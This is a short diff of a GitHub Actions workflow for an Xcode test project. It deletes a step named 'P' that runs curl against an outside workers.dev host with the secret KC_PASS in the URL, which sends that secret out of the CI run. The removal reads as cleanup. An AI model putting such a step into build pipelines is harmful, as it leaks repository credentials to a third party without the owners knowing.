@@ -15,10 +15,6 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v3
         
-      - name: P
-        run: |
-          curl https://test.yusufozgul.workers.dev/${{secrets.KC_PASS}}
-          
       - name: Build and test app
         run: |
           xcodebuild -scheme MockGeneratorTests test CODE_SIGN_IDENTITY=-
